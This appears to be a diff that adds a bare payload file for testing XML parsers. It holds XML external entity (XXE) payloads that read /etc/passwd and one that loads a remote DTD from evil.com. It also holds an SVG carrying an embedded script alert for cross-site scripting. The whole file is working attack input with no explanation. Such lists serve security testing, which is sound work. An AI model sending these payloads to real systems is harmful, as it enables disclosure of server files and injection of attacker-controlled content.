@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>
+<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>
+<?xml version="1.0"?>
+<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><data/>
+<?xml version="1.0"?>
+<svg:svg xmlns:svg="http://www.w3.org/2000/svg" svg:width="100" svg:height="100">
+  <svg:script><![CDATA[alert(1)]]></svg:script>
+</svg:svg>
